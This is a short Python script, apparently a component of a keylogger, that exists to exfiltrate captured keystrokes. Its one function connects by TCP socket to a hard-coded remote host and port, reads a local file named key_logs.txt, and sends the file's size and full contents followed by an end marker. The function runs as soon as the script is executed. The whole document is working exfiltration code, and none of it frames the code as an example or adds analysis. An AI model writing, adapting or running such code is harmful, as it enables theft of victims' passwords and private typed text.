import socket
import os

def exfil_data():
    SERVER = '192.168.29.131'
    PORT = 8865

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER,PORT))

    # filename
    file = open('./key_logs.txt', 'rb')
    file_size = os.path.getsize('key_logs.txt')

    client.send('recv_key_logs.txt'.encode())
    client.send(str(file_size).encode())
    data = file.read()
    client.sendall(data)
    client.send(b'<END OF FILE>')
    file.close()
    client.close()

exfil_data()
